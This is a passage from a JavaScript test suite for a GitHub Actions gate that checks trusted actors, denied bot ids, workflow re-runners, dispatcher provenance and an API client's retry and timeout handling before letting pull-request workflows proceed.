  const github = fakeGitHub({ [pullRoute]: fixture("api-pull-42.json") });
  assert.deepEqual(
    await gate({
      eventName: "workflow_dispatch",
      event: fixture("event-workflow-dispatch.json"),
      github,
      prNumber: "42",
      requirePr: "true",
    }),
    PROCEED,
  );
});

// other events

test("an event the gate does not handle stops with no-pr", async () => {
  assert.deepEqual(
    await gate({ eventName: "pull_request_target", event: fixture("event-pull-request.json") }),
    STOPPED("no-pr"),
  );
});

// trusted-actor list

test("a missing list stops with list-unreadable", async () => {
  assert.deepEqual(
    await gate({
      eventName: "pull_request",
      event: fixture("event-pull-request.json"),
      list: path.join(dir, "absent.json"),
    }),
    STOPPED("list-unreadable"),
  );
});

test("a list that is not JSON stops with list-unreadable", async () => {
  assert.deepEqual(
    await gate({
      eventName: "pull_request",
      event: fixture("event-pull-request.json"),
      list: writeJson("list.json", "{ not json"),
    }),
    STOPPED("list-unreadable"),
  );
});

const validActor = { id: 153232337, login: "kyle-sexton", kind: "human" };
for (const [label, list] of [
  ["a string id", { version: 1, actors: [{ ...validActor, id: "153232337" }] }],
  ["an id of zero", { version: 1, actors: [{ ...validActor, id: 0 }] }],
  ["a fractional id", { version: 1, actors: [{ ...validActor, id: 1.5 }] }],
  ["an unknown kind", { version: 1, actors: [{ ...validActor, kind: "admin" }] }],
  ["a missing login", { version: 1, actors: [{ id: 153232337, kind: "human" }] }],
  ["an extra actor key", { version: 1, actors: [{ ...validActor, trusted: true }] }],
  ["an extra top-level key", { version: 1, actors: [validActor], extra: [] }],
  ["version 2", { version: 2, actors: [validActor] }],
  ["actors not an array", { version: 1, actors: { 0: validActor } }],
  ["a null actor", { version: 1, actors: [null] }],
]) {
  test(`a schema-invalid list (${label}) stops with list-unreadable`, async () => {
    assert.deepEqual(
      await gate({
        eventName: "pull_request",
        event: fixture("event-pull-request.json"),
        list: writeJson("list.json", list),
      }),
      STOPPED("list-unreadable"),
    );
  });
}

test("loadTrustedActors returns the listed ids", () => {
  assert.deepEqual(
    [...loadTrustedActors(LIST)].sort((a, b) => a - b),
    [49699333, 153232337, 209825114, 337595936],
  );
});

// denied actor ids (bot-actor) and the re-runner (triggering-actor)

const LANES_BOT = { login: "melodic-automation-lanes[bot]", id: 337595936, type: "Bot" };
const DENY_BOT = "337595936";

test("bot-actor: a listed lanes bot proceeds when no id is denied", async () => {
  const event = fixture("event-pull-request.json");
  event.sender = LANES_BOT;
  assert.deepEqual(await gate({ eventName: "pull_request", event }), PROCEED);
});

test("bot-actor: a denied sender stops even though it is listed", async () => {
  const event = fixture("event-pull-request.json");
  event.sender = LANES_BOT;
  assert.deepEqual(
    await gate({ eventName: "pull_request", event, deniedActorIds: DENY_BOT }),
    STOPPED("bot-actor"),
  );
});

test("bot-actor: a denied dispatcher on workflow_dispatch stops", async () => {
  const event = fixture("event-workflow-dispatch.json");
  event.sender = LANES_BOT;
  const github = fakeGitHub({
    [`GET /repos/${REPOSITORY}/pulls/42`]: fixture("api-pull-42.json"),
  });
  assert.deepEqual(
    await gate({
      eventName: "workflow_dispatch",
      event,
      github,
      prNumber: "42",
      deniedActorIds: DENY_BOT,
    }),
    STOPPED("bot-actor"),
  );
});

for (const field of ["actor", "triggering_actor"]) {
  test(`bot-actor: a denied workflow_run.${field} stops`, async () => {
    const event = fixture("event-workflow-run.json");
    event.workflow_run[field] = LANES_BOT;
    const github = fakeGitHub({ [commitPulls]: [fixture("api-pull-42.json")] });
    assert.deepEqual(
      await gate({ eventName: "workflow_run", event, github, deniedActorIds: DENY_BOT }),
      STOPPED("bot-actor"),
    );
  });
}

test("untrusted-rerunner: a denied re-runner, matched by its listed login, stops with no skip mapping", async () => {
  assert.deepEqual(
    await gate({
      eventName: "pull_request",
      event: fixture("event-pull-request.json"),
      deniedActorIds: `1, ${DENY_BOT}`,
      triggeringActor: "Melodic-Automation-Lanes[bot]",
    }),
    STOPPED("untrusted-rerunner"),
  );
});

test("bot-actor: a denied id that is not among the actors does not stop", async () => {
  assert.deepEqual(
    await gate({
      eventName: "pull_request",
      event: fixture("event-pull-request.json"),
      deniedActorIds: DENY_BOT,
    }),
    PROCEED,
  );
});

test("bot-actor: a malformed denied-id list stops with list-unreadable", async () => {
  assert.deepEqual(
    await gate({
      eventName: "pull_request",
      event: fixture("event-pull-request.json"),
      deniedActorIds: "337595936,lanes-bot",
    }),
    STOPPED("list-unreadable"),
  );
});

test("triggering-actor: a listed re-runner proceeds whatever the login's case", async () => {
  assert.deepEqual(
    await gate({
      eventName: "pull_request",
      event: fixture("event-pull-request.json"),
      triggeringActor: "Kyle-Sexton",
    }),
    PROCEED,
  );
});

test("untrusted-rerunner: an unlisted re-runner of a trusted run stops", async () => {
  assert.deepEqual(
    await gate({
      eventName: "pull_request",
      event: fixture("event-pull-request.json"),
      triggeringActor: "stranger",
    }),
    STOPPED("untrusted-rerunner"),
  );
});

test("untrusted-rerunner: an empty re-runner login does not skip the check of the record's id", async () => {
  for (const [rerunner, expected] of [
    [USERS["kyle-sexton"], PROCEED],
    [STRANGER, STOPPED("untrusted-rerunner")],
  ]) {
    assert.deepEqual(
      await gate({
        eventName: "pull_request",
        event: fixture("event-pull-request.json"),
        triggeringActor: "",
        rerunner,
      }),
      expected,
    );
  }
});

// failure handling

test("an unreadable event payload stops the gate instead of throwing", async () => {
  const outputPath = writeJson("output", "");
  await main({
    env: {
      EVENT_NAME: "pull_request",
      EVENT_PATH: path.join(dir, "absent-event.json"),
      TRUSTED_ACTORS_PATH: LIST,
      REPOSITORY,
      GITHUB_OUTPUT: outputPath,
    },
    github: fakeGitHub({}),
  });
  assert.equal(readOutputs(readFileSync(outputPath, "utf8")).proceed, "false");
});

test("a missing repository stops the gate even when the head repo is null", async () => {
  const event = fixture("event-pull-request.json");
  event.pull_request.head.repo = null;
  const outputPath = writeJson("output", "");
  await main({
    env: {
      EVENT_NAME: "pull_request",
      EVENT_PATH: writeJson("event.json", event),
      TRUSTED_ACTORS_PATH: LIST,
      GITHUB_OUTPUT: outputPath,
    },
    github: fakeGitHub({}),
  });
  assert.deepEqual(readOutputs(readFileSync(outputPath, "utf8")), STOPPED("no-pr"));
});

test("the CLI exits 0 with proceed=false when its inputs are missing", () => {
  const outputPath = writeJson("output", "");
  const result = spawnSync(process.execPath, [SCRIPT], {
    env: { PATH: process.env.PATH, GITHUB_OUTPUT: outputPath },
    encoding: "utf8",
  });
  assert.equal(result.status, 0);
  assert.equal(readOutputs(readFileSync(outputPath, "utf8")).proceed, "false");
});

// GitHub client

test("createGitHub forwards a caller's headers to fetch", async () => {
  let headers;
  const fetchImpl = async (url, init) => {
    headers = init.headers;
    return new Response("{}", { status: 200 });
  };
  await createGitHub({ token: "t0ken", fetchImpl })("POST", "/graphql", {}, { Connection: "close" });
  assert.equal(headers.Connection, "close");
  assert.equal(headers.Authorization, "Bearer t0ken");
});

test("createGitHub sends the token and raises GitHubError with the status on failure", async () => {
  const seen = [];
  const fetchImpl = async (url, init) => {
    seen.push({ url, auth: init.headers.Authorization, method: init.method });
    return url.endsWith("/ok")
      ? new Response(JSON.stringify({ ok: 1 }), { status: 200 })
      : new Response("{}", { status: 404 });
  };
  const github = createGitHub({ token: "t0ken", apiUrl: "https://api.example", fetchImpl });
  assert.deepEqual(await github("GET", "/ok"), { ok: 1 });
  await assert.rejects(github("GET", "/missing"), (error) => {
    assert.ok(error instanceof GitHubError);
    assert.equal(error.status, 404);
    return true;
  });
  assert.deepEqual(seen[0], { url: "https://api.example/ok", auth: "Bearer t0ken", method: "GET" });
});

test("createGitHub returns null for a success with no body", async () => {
  const fetchImpl = async () => new Response(null, { status: 201 });
  const github = createGitHub({ token: "t", apiUrl: "https://api.example", fetchImpl });
  assert.equal(await github("POST", "/repos/o/r/actions/runs/1/rerun"), null);
});

test("createGitHub raises on a GraphQL response that carries errors", async () => {
  const fetchImpl = async () =>
    new Response(JSON.stringify({ data: null, errors: [{ message: "nope" }] }), { status: 200 });
  const github = createGitHub({ token: "t", apiUrl: "https://api.example", fetchImpl });
  await assert.rejects(github("POST", "/graphql", { query: "{}" }), GitHubError);
});

test("createGitHub opted into keepGraphQLErrors returns the answer with its errors", async () => {
  const answer = { data: { repository: { p0: null } }, errors: [{ type: "NOT_FOUND", path: ["repository", "p0"] }] };
  const fetchImpl = async () => new Response(JSON.stringify(answer), { status: 200 });
  const github = createGitHub({ token: "t", apiUrl: "https://api.example", fetchImpl, keepGraphQLErrors: true });
  assert.deepEqual(await github("POST", "/graphql", { query: "{}" }), answer);
});

// A GET that GitHub answers 5xx, or that never gets an answer, is sent again
// after 2 s, 4 s and 8 s, each with equal jitter (half fixed, half random), and
// no client waits more than 60 s in all (runs 39786710017 and 39788855311 each
// failed a lane on one 500 from GET /commits/{sha}/pulls).
function flaky(answers) {
  const sent = [];
  const slept = [];
  const fetchImpl = async (url, init) => {
    sent.push(`${init.method} ${url.slice("https://api.example".length)}`);
    const answer = answers.shift();
    if (answer instanceof Error) {
      throw answer;
    }
    return new Response(answer.body ?? "{}", { status: answer.status, headers: answer.headers });
  };
  const options = { token: "t", apiUrl: "https://api.example", fetchImpl, sleep: async (ms) => slept.push(ms), log: () => {} };
  return { sent, slept, options };
}
const PULLS_PATH = "/repos/o/r/commits/b71c10a14e3a918023100604e2272592ed11f677/pulls?per_page=100&page=1";

test("createGitHub sends a GET that answered 500 again and returns the next answer", async () => {
  const gh = flaky([{ status: 500 }, { status: 200, body: '[{"number":7}]' }]);
  const github = createGitHub({ ...gh.options, random: () => 0 });
  assert.deepEqual(await github("GET", PULLS_PATH), [{ number: 7 }]);
  assert.deepEqual(gh.sent, [`GET ${PULLS_PATH}`, `GET ${PULLS_PATH}`]);
  assert.deepEqual(gh.slept, [1000]);
});

// GitHub Support's probe on 2026-10-22: GET /commits/{sha}/pulls
// answered 200 with an empty body ("unexpected end of JSON input").
test("createGitHub sends a GET answered 200 with an empty body again", async () => {
  const gh = flaky([{ status: 200, body: "" }, { status: 200, body: '[{"number":7}]' }]);
  const github = createGitHub({ ...gh.options, random: () => 0 });
  assert.deepEqual(await github("GET", PULLS_PATH), [{ number: 7 }]);
  assert.deepEqual(gh.slept, [1000]);
});

test("createGitHub sends a GET answered 200 with cut-off JSON again", async () => {
  const json = { "content-type": "application/json; charset=utf-8" };
  const gh = flaky([{ status: 200, body: '[{"num', headers: json }, { status: 200, body: "[]", headers: json }]);
  const github = createGitHub({ ...gh.options, random: () => 0 });
  assert.deepEqual(await github("GET", PULLS_PATH), []);
  assert.equal(gh.sent.length, 2);
});

test("createGitHub sends a GET whose fetch threw again", async () => {
  const gh = flaky([new TypeError("fetch failed"), { status: 200, body: "[]" }]);
  const github = createGitHub({ ...gh.options, random: () => 1 });
  assert.deepEqual(await github("GET", PULLS_PATH), []);
  assert.deepEqual(gh.slept, [2000]);
});

test("createGitHub gives up on a GET after four 5xx answers and raises the last status", async () => {
  const gh = flaky([{ status: 500 }, { status: 502 }, { status: 503 }, { status: 504 }, { status: 200 }]);
  const github = createGitHub({ ...gh.options, random: () => 0 });
  await assert.rejects(github("GET", PULLS_PATH), (error) => error instanceof GitHubError && error.status === 504);
  assert.equal(gh.sent.length, 4);
  assert.deepEqual(gh.slept, [1000, 2000, 4000]);
});

test("createGitHub sends a 404, a 403 and a POST answered 500 once", async () => {
  const gh = flaky([{ status: 404 }, { status: 403 }, { status: 500 }]);
  const github = createGitHub({ ...gh.options, random: () => 0 });
  await assert.rejects(github("GET", "/missing"), (error) => error.status === 404);
  await assert.rejects(github("GET", "/refused"), (error) => error.status === 403);
  await assert.rejects(github("POST", "/repos/o/r/dispatches", {}), (error) => error.status === 500);
  assert.equal(gh.sent.length, 3);
  assert.deepEqual(gh.slept, []);
});

test("createGitHub waits at most 60 s on 5xx answers across all its calls", async () => {
  const gh = flaky(Array.from({ length: 30 }, () => ({ status: 500 })));
  const github = createGitHub({ ...gh.options, random: () => 1 });
  for (let call = 0; call < 5; call += 1) {
    await assert.rejects(github("GET", PULLS_PATH), (error) => error.status === 500);
  }
  // Four calls wait 2 + 4 + 8 s each; the fifth waits 2 s, and its next 4 s
  // would pass 60, so it raises after its second answer.
  assert.deepEqual(gh.slept.slice(-2), [8000, 2000]);
  assert.equal(gh.slept.reduce((sum, ms) => sum + ms, 0), 58000);
  assert.equal(gh.sent.length, 4 * 4 + 2);
});

// A connection that never answers: undici would wait its own header timeout
// per attempt, past a 3-minute gate step (pr-merge.yml's gate-check).
const hung = (sent) => async (url, init) => {
  sent.push(url);
  return new Promise((_, reject) => init.signal.addEventListener("abort", () => reject(init.signal.reason)));
};

test("createGitHub aborts a GET that never answers and sends it again", async () => {
  const sent = [];
  const slept = [];
  const github = createGitHub({
    token: "t",
    apiUrl: "https://api.example",
    fetchImpl: hung(sent),
    attemptTimeoutMs: 5,
    sleep: async (ms) => slept.push(ms),
    random: () => 0,
    log: () => {},
  });
  await assert.rejects(github("GET", PULLS_PATH), (error) => error.name === "TimeoutError");
  assert.equal(sent.length, 4);
  assert.deepEqual(slept, [1000, 2000, 4000]);
});

// A write GitHub accepts slowly must not look failed: a dispatch retried
// above this client would start a lane run twice. Scaled down: the attempt
// timeout is 5 ms and the POST answers after 30 ms.
test("createGitHub never aborts a slow POST and sends it once", async () => {
  const sent = [];
  const github = createGitHub({
    token: "t",
    apiUrl: "https://api.example",
    fetchImpl: async (url, init) => {
      sent.push(init.method);
      await new Promise((resolve) => setTimeout(resolve, 30));
      if (init.signal?.aborted) {
        throw init.signal.reason;
      }
      return new Response(null, { status: 204 });
    },
    attemptTimeoutMs: 5,
    sleep: async () => {},
    log: () => {},
  });
  assert.equal(await github("POST", "/repos/o/r/actions/workflows/pr-unblock.yml/dispatches", {}), null);
  assert.deepEqual(sent, ["POST"]);
});

test("createGitHub counts the time a failed attempt took against the 60 s budget", async () => {
  let clock = 0;
  const sent = [];
  const slept = [];
  const github = createGitHub({
    token: "t",
    apiUrl: "https://api.example",
    // Each attempt takes 20 s of the clock, then times out.
    fetchImpl: async (url) => {
      sent.push(url);
      clock += 20_000;
      throw new DOMException("The operation was aborted due to timeout", "TimeoutError");
    },
    now: () => clock,
    sleep: async (ms) => {
      slept.push(ms);
      clock += ms;
    },
    random: () => 0,
    log: () => {},
  });
  await assert.rejects(github("GET", PULLS_PATH), (error) => error.name === "TimeoutError");
  // 20 + 1 + 20 + 2 + 20 s is 63 s: the third attempt's 4 s wait is not taken.
  assert.equal(sent.length, 3);
  assert.deepEqual(slept, [1000, 2000]);
});

const FAKE_TOKEN = "fake-secret-marker-9c41";

test("createGitHub raises a non-network fetch error at once and never logs its message", async () => {
  const lines = [];
  let sent = 0;
  const github = createGitHub({
    token: FAKE_TOKEN,
    apiUrl: "https://api.example",
    fetchImpl: async () => {
      sent += 1;
      throw new TypeError(`Headers.append: "Bearer ${FAKE_TOKEN}\n" is an invalid header value.`);
    },
    sleep: async () => {},
    log: (line) => lines.push(line),
  });
  await assert.rejects(github("GET", PULLS_PATH), TypeError);
  assert.equal(sent, 1);
  assert.ok(!lines.join("\n").includes(FAKE_TOKEN));
});

test("a network failure's retry line names the error and its code, not its message", async () => {
  const lines = [];
  const answers = [Object.assign(new TypeError("fetch failed"), { cause: Object.assign(new Error(`connect to ${FAKE_TOKEN}`), { code: "ECONNRESET" }) })];
  const github = createGitHub({
    token: "t",
    apiUrl: "https://api.example",
    fetchImpl: async () => {
      if (answers.length > 0) throw answers.shift();
      return new Response("[]", { status: 200 });
    },
    sleep: async () => {},
    random: () => 0,
    log: (line) => lines.push(line),
  });
  assert.deepEqual(await github("GET", PULLS_PATH), []);
  assert.equal(lines.length, 1);
  assert.match(lines[0], /failed \(TypeError ECONNRESET\)/);
  assert.ok(!lines[0].includes(FAKE_TOKEN));
});

test("commitPulls never logs the REST error's message when it falls back to GraphQL", async () => {
  const lines = [];
  const pulls = await readCommitPulls({
    repository: REPOSITORY,
    sha: HEAD_SHA,
    readRest: async () => {
      throw new TypeError(`Headers.append: "Bearer ${FAKE_TOKEN}\n" is an invalid header value.`);
    },
    readGraphQL: async () => associated(GRAPHQL_PULL_42).data,
    log: (line) => lines.push(line),
  });
  assert.equal(pulls[0].number, 42);
  assert.equal(lines.length, 1);
  assert.ok(!lines[0].includes(FAKE_TOKEN));
});

// A dispatcher started by workflow_run when a review lane finished on the PR
// (pr-feedback-dispatch.yml). Its run record reports the default branch and its
// tip, as pr-merge.yml's workflow_run runs did (run 38779143370 after review run
// 38779135732 on release/plugins).

const RUN_DISPATCHER_WORKFLOW = ".github/workflows/pr-feedback-dispatch.yml";
const REVIEW_WORKFLOW = ".github/workflows/pr-review-hosted.yml";
const SECURITY_WORKFLOW = ".github/workflows/pr-review-security-hosted.yml";
const UPSTREAMS = `${REVIEW_WORKFLOW} ${SECURITY_WORKFLOW}`;
const UPSTREAM_RUN_ID = "38779135732";
const upstreamRoute = `GET /repos/${REPOSITORY}/actions/runs/${UPSTREAM_RUN_ID}`;
const UPSTREAM = {
  id: Number(UPSTREAM_RUN_ID),
  name: "pr-review-hosted",
  path: REVIEW_WORKFLOW,
  event: "pull_request",
  status: "completed",
  head_branch: "feat/lane-probe",
  head_sha: HEAD_SHA,
  actor: LANES_BOT,
  triggering_actor: LANES_BOT,
  repository: { id: 1, full_name: REPOSITORY },
  head_repository: { id: 1, full_name: REPOSITORY },
};
const RUN_DISPATCHER = {
  path: RUN_DISPATCHER_WORKFLOW,
  name: "pr-feedback-dispatch",
  event: "workflow_run",
  actor: LANES_BOT,
  triggering_actor: LANES_BOT,
};
const runRecord = (name = `pr-feedback-dispatched-${UPSTREAM_RUN_ID}-${SELF_RUN_ID}`) =>
  listing(record({ name }));

function runDispatcherRoutes({ dispatcher = {}, upstream = {}, artifacts = runRecord(), ...rest } = {}) {
  return {
    ...dispatcherRoutes({ dispatcher: { ...RUN_DISPATCHER, ...dispatcher }, artifacts, ...rest }),
    [upstreamRoute]: upstream instanceof GitHubError ? upstream : { ...UPSTREAM, ...upstream },
  };
}

const runDispatched = (options) =>
  dispatched({
    runDispatcherWorkflow: RUN_DISPATCHER_WORKFLOW,
    runDispatcherUpstreams: UPSTREAMS,
    lanesAppId: String(LANES_BOT.id),
    ...options,
  });

test("workflow_run dispatcher: a review run at the PR head proceeds and reads the upstream run", async () => {
  const github = fakeGitHub(runDispatcherRoutes());
  assert.deepEqual(await runDispatched({ github }), PROCEED);
  assert.ok(github.calls.includes(upstreamRoute));
  assert.ok(github.calls.includes(compareRoute));
});

test("workflow_run dispatcher: a security review run at the PR head proceeds", async () => {
  const github = fakeGitHub(
    runDispatcherRoutes({ upstream: { path: SECURITY_WORKFLOW, name: "pr-review-security-hosted" } }),
  );
  assert.deepEqual(await runDispatched({ github }), PROCEED);
});

for (const [label, overrides] of [
  ["the upstream is another workflow", { upstream: { path: ".github/workflows/ci.yml" } }],
  ["the upstream only shares the review workflow's name", {
    upstream: { path: ".github/workflows/copy.yml", name: "pr-review-hosted" },
  }],
  ["the upstream path names the review workflow at another ref", {
    upstream: { path: `${REVIEW_WORKFLOW}@refs/heads/feat/x` },
  }],
  ["the upstream ran on push", { upstream: { event: "push" } }],
  ["the upstream ran on pull_request_target", { upstream: { event: "pull_request_target" } }],
  ["the upstream ran on a fork's head", {
    upstream: { head_repository: { id: 2, full_name: "stranger/claude-code-plugins" } },
  }],
  ["the upstream belongs to another repository", {
    upstream: { repository: { id: 2, full_name: "stranger/claude-code-plugins" } },
  }],
  ["the upstream reviewed an older head", { upstream: { head_sha: BASE_SHA } }],
  ["the upstream read is another run", { upstream: { id: 38779135733 } }],
  ["the upstream read fails", { upstream: new GitHubError(404, "run") }],
  ["the dispatcher is the push dispatcher's workflow", { dispatcher: { path: DISPATCHER_WORKFLOW } }],
  ["the dispatcher ran on another branch", { dispatcher: { head_branch: "feat/forged" } }],
  ["the dispatcher's head is not on the default branch", { compare: { status: "diverged" } }],
  ["the dispatcher re-run was triggered by the lanes App", {
    dispatcher: { run_attempt: 2, triggering_actor: LANES_BOT },
  }],
  ["the record names this run under the push dispatcher's prefix", {
    artifacts: runRecord(`pr-unblock-dispatched-${UPSTREAM_RUN_ID}-${SELF_RUN_ID}`),
  }],
  ["the record names another dispatched run", {
    artifacts: runRecord(`pr-feedback-dispatched-${UPSTREAM_RUN_ID}-38155580530`),
  }],
  ["the record names this run but no upstream", {
    artifacts: runRecord(`pr-feedback-dispatched-${SELF_RUN_ID}`),
  }],
  ["the record names two dispatched runs", {
    artifacts: runRecord(`pr-feedback-dispatched-${UPSTREAM_RUN_ID}-${SELF_RUN_ID}-38155580530`),
  }],
  ["the upstream was started by an unlisted account", {
    upstream: { actor: { login: "stranger", id: 999, type: "User" }, triggering_actor: { login: "stranger", id: 999, type: "User" } },
  }],
  ["the upstream was re-run by an unlisted account", {
    upstream: { triggering_actor: { login: "stranger", id: 999, type: "User" } },
  }],
  ["the upstream names no actor", { upstream: { actor: undefined } }],
]) {
  test(`workflow_run dispatcher: refused with untrusted-actor when ${label}`, async () => {
    const github = fakeGitHub(
      runDispatcherRoutes({ dispatcher: { status: "completed" }, ...overrides }),
    );
    assert.deepEqual(await runDispatched({ github }), STOPPED("untrusted-actor"));
  });
}

test("workflow_run dispatcher: refused when the lanes App id is not passed, since its review then vouches for nothing", async () => {
  const github = fakeGitHub(runDispatcherRoutes());
  assert.deepEqual(await runDispatched({ github, lanesAppId: "" }), STOPPED("untrusted-actor"));
});

test("workflow_run dispatcher: a review a listed human started proceeds", async () => {
  const github = fakeGitHub(runDispatcherRoutes({ upstream: { actor: KYLE, triggering_actor: KYLE } }));
  assert.deepEqual(await runDispatched({ github }), PROCEED);
});

// A job after pr-unblock's model job: the review was of the head that job was
// gated on, and the PR has since moved by the lanes App's own signed commits.
const GATED_SHA = "9".repeat(40);
const afterRoute = `GET /repos/${REPOSITORY}/compare/${GATED_SHA}...${HEAD_SHA}`;
// The shape of the lanes App's commits on #7493 and #7520: author the App,
// committer web-flow, signature valid.
const WEB_FLOW = { login: "web-flow", id: 19864447, type: "User" };
const laneCommit = (overrides = {}) => ({
  sha: "8".repeat(40),
  author: LANES_BOT,
  committer: WEB_FLOW,
  commit: { committer: { date: "2026-10-11T12:30:00Z" }, verification: { verified: true, reason: "valid" } },
  ...overrides,
});
const range = (...commits) => ({ status: "ahead", total_commits: commits.length, commits });
const afterRoutes = (compare, upstream = {}) =>
  fakeGitHub({ ...runDispatcherRoutes({ upstream: { head_sha: GATED_SHA, ...upstream } }), [afterRoute]: compare });

test("expected upstream head: verified lanes App commits after the gated head proceed", async () => {
  const github = afterRoutes(range(laneCommit(), laneCommit({ sha: "7".repeat(40) })));
  assert.deepEqual(await runDispatched({ github, expectedUpstreamHead: GATED_SHA }), PROCEED);
  assert.ok(github.calls.includes(afterRoute));
});

test("expected upstream head: a PR head still at the gated head proceeds with no range read", async () => {
  const github = fakeGitHub(runDispatcherRoutes());
  assert.deepEqual(await runDispatched({ github, expectedUpstreamHead: HEAD_SHA }), PROCEED);
});

for (const [label, github] of [
  ["a foreign commit follows the gated head", () => afterRoutes(range(laneCommit(), laneCommit({ author: KYLE })))],
  ["an unsigned lanes App commit follows the gated head", () =>
    afterRoutes(range(laneCommit({ commit: { committer: { date: "2026-10-11T12:30:00Z" }, verification: { verified: false, reason: "unsigned" } } })))],
  ["a human signed and pushed a commit naming the App as author", () =>
    afterRoutes(range(laneCommit({ committer: KYLE })))],
  ["a verified commit whose reason is not valid follows the gated head", () =>
    afterRoutes(range(laneCommit({ commit: { committer: { date: "2026-10-11T12:30:00Z" }, verification: { verified: true, reason: "bad_email" } } })))],
  ["an App commit made before this run was created follows the gated head", () =>
    afterRoutes(range(laneCommit({ commit: { committer: { date: "2026-10-11T11:00:00Z" }, verification: { verified: true, reason: "valid" } } })))],
  ["a commit with no linked author follows the gated head", () => afterRoutes(range(laneCommit({ author: null })))],
  ["GitHub truncated the range", () => afterRoutes({ ...range(laneCommit()), total_commits: 251 })],
  ["the PR head diverged from the gated head", () => afterRoutes({ ...range(laneCommit()), status: "diverged" })],
  ["the range read fails", () => afterRoutes(new GitHubError(404, "compare"))],
  ["the upstream reviewed another head than the gated one", () =>
    afterRoutes(range(laneCommit()), { head_sha: BASE_SHA })],
  ["the gated head is not a SHA", () => afterRoutes(range(laneCommit()))],
]) {
  test(`expected upstream head: refused with untrusted-actor when ${label}`, async () => {
    const expectedUpstreamHead = label === "the gated head is not a SHA" ? "main" : GATED_SHA;
    assert.deepEqual(await runDispatched({ github: github(), expectedUpstreamHead }), STOPPED("untrusted-actor"));
  });
}

// GET /pulls lags a push by minutes (run 39615724332 on #8870 gated the head
// the model job had already moved past), so the gate re-reads it until it
// agrees with the branch ref.
const pullAt = (sha) => {
  const pull = fixture("api-pull-42.json");
  pull.head.sha = sha;
  return pull;
};

test("expected upstream head: a pulls read lagging the branch ref is re-read until it shows the pushed head", async () => {
  const github = afterRoutes(range(laneCommit()));
  github.routes[pullRoute] = inTurn(pullAt(GATED_SHA), pullAt(GATED_SHA), pullAt(HEAD_SHA));
  const sleep = fakeSleep();
  const outputs = await runDispatched({ github, expectedUpstreamHead: GATED_SHA, sleep });
  assert.equal(outputs["head-sha"], HEAD_SHA);
  assert.deepEqual(outputs, PROCEED);
  assert.deepEqual(sleep.waits, [5000, 10_000]);
  assert.ok(github.calls.includes(afterRoute));
});

test("expected upstream head: a pulls read that never reaches the branch ref stops with head-lag", async () => {
  const github = afterRoutes(range(laneCommit()));
  github.routes[pullRoute] = pullAt(GATED_SHA);
  const sleep = fakeSleep();
  assert.deepEqual(
    await runDispatched({ github, expectedUpstreamHead: GATED_SHA, sleep }),
    STOPPED("head-lag"),
  );
  assert.deepEqual(sleep.waits, [5000, 10_000, 20_000, 25_000]);
});

const lagDispatch = (routes, sleep) =>
  gate({
    eventName: "workflow_dispatch",
    event: fixture("event-workflow-dispatch.json"),
    github: fakeGitHub(routes),
    prNumber: "42",
    sleep,
  });

test("workflow_dispatch: a branch ref read failing other than 404 stops with no-pr and no wait", async () => {
  const sleep = fakeSleep();
  const outputs = await lagDispatch(
    { [pullRoute]: fixture("api-pull-42.json"), [HEAD_REF_ROUTE]: new GitHubError(500, "ref") },
    sleep,
  );
  assert.deepEqual(outputs, STOPPED("no-pr"));
  assert.deepEqual(sleep.waits, []);
});

test("workflow_dispatch: a missing branch ref waits the whole schedule, then stops with head-lag", async () => {
  const sleep = fakeSleep();
  const outputs = await lagDispatch(
    { [pullRoute]: fixture("api-pull-42.json"), [HEAD_REF_ROUTE]: new GitHubError(404, "ref") },
    sleep,
  );
  assert.deepEqual(outputs, STOPPED("head-lag"));
  assert.deepEqual(sleep.waits, [5000, 10_000, 20_000, 25_000]);
});

test("workflow_dispatch: a pulls re-read that fails stops with no-pr", async () => {
  const sleep = fakeSleep();
  const outputs = await lagDispatch(
    { [pullRoute]: inTurn(pullAt(GATED_SHA), new GitHubError(500, "pulls")) },
    sleep,
  );
  assert.deepEqual(outputs, STOPPED("no-pr"));
  assert.deepEqual(sleep.waits, [5000]);
});

test("expected upstream head: refused on a push dispatcher and on a human's own dispatch", async () => {
  assert.deepEqual(
    await runDispatched({ github: fakeGitHub(dispatcherRoutes()), expectedUpstreamHead: HEAD_SHA }),
    STOPPED("untrusted-actor"),
  );
  const event = fixture("event-workflow-dispatch-dispatcher.json");
  event.sender = KYLE;
  assert.deepEqual(
    await runDispatched({ github: fakeGitHub(runDispatcherRoutes()), event, expectedUpstreamHead: HEAD_SHA }),
    STOPPED("untrusted-actor"),
  );
});

test("workflow_run dispatcher: refused when the gate names no workflow_run dispatcher", async () => {
  const github = fakeGitHub(runDispatcherRoutes());
  assert.deepEqual(
    await runDispatched({ github, runDispatcherWorkflow: "" }),
    STOPPED("untrusted-actor"),
  );
  assert.ok(!github.calls.includes(upstreamRoute));
});

test("workflow_run dispatcher: refused when the gate names no upstream workflows", async () => {
  const github = fakeGitHub(runDispatcherRoutes());
  assert.deepEqual(
    await runDispatched({ github, runDispatcherUpstreams: "" }),
    STOPPED("untrusted-actor"),
  );
});

test("workflow_run dispatcher: the feedback dispatcher's path on a push run is refused", async () => {
  const github = fakeGitHub(
    runDispatcherRoutes({ dispatcher: { event: "push" }, artifacts: listing(record()) }),
  );
  assert.deepEqual(await runDispatched({ github }), STOPPED("untrusted-actor"));
});

test("workflow_run dispatcher: the push dispatcher still proceeds with both configured", async () => {
  const github = fakeGitHub(dispatcherRoutes());
  assert.deepEqual(await runDispatched({ github }), PROCEED);
  assert.ok(!github.calls.includes(upstreamRoute));
});

test("workflow_run dispatcher: a listed human's own dispatch is unchanged", async () => {
  const event = fixture("event-workflow-dispatch-dispatcher.json");
  event.sender = KYLE;
  const github = fakeGitHub(runDispatcherRoutes({ self: { triggering_actor: KYLE } }));
  assert.deepEqual(
    await runDispatched({ github, event, triggeringActor: "kyle-sexton" }),
    PROCEED,
  );
  assert.deepEqual(github.calls, [pullRoute, HEAD_REF_ROUTE, selfRoute]);
});

// The re-runner is read by id from this run's own record
// (GET /actions/runs/{run_id}), never by login: a released login another
// account registers stays untrusted.

const prPaths = {
  pull_request: () => ({ eventName: "pull_request", event: fixture("event-pull-request.json") }),
  workflow_dispatch: () => ({
    eventName: "workflow_dispatch",
    event: fixture("event-workflow-dispatch.json"),
    prNumber: "42",
    github: fakeGitHub({ [pullRoute]: fixture("api-pull-42.json") }),
  }),
  workflow_run: () => ({
    eventName: "workflow_run",
    event: fixture("event-workflow-run.json"),
    github: fakeGitHub({ [commitPulls]: [fixture("api-pull-42.json")] }),
  }),
};

for (const [name, path_] of Object.entries(prPaths)) {
  test(`re-runner by id: ${name}, a listed login held by another id stops`, async () => {
    assert.deepEqual(await gate({ ...path_(), rerunner: IMPOSTOR }), STOPPED("untrusted-rerunner"));
  });

